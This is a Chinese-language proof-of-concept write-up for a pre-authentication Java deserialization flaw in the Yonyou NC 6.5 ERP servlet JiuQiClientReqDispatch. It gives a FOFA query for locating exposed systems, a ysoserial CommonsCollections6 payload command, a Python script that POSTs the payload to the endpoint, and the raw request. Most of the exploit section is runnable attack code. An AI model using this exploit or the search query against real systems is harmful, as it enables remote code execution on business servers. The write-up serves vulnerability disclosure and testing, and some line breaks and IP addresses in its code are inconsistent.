**漏洞描述**

用友NC是一个全面的企业资源规划（ERP）软件，可以帮助中小型企业实现资源规划和管理。该软件综合了财务、销售、采购、库存、生产、人力资源、客户关系管理等业务。

**fofa搜索语句**

app="用友-UFIDA-NC"

**影响版本**

版本号nc6.5产品**漏洞复现**

代码审计moudules/ufoe模块路由时，发现com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch类存在反序列化漏洞。

缺陷代码如下：

![图片](%E7%94%A8%E5%8F%8Bnc65%20jiuqisingleservlet%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20POC+%E5%88%86%E6%9E%90.assets/640.png)

### 漏洞复现

①：利用ysoserial生成恶意包。

```
java -jar ysoserial-all.jar CommonsCollections6"calc.exe">nc65.bin
```

②：编写python脚本，读取nc65.bin并构造POST请求。

```yaml

import requests
proxies={"http":"http://127.0.0.1:8888"}
with open("nc65.bin","rb") as f:
 data =
f.read()
url =
"http://192.168.40.146:8010/servlet/~ufoe/com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch"
r = requests.post(url=url, data=data, proxies=proxies)
print(r)
```

完整数据包如下：

```yaml
POST
/servlet/~ufoe/com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch HTTP/1.1
Host: 192.168.40.149:8010
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 1281

```

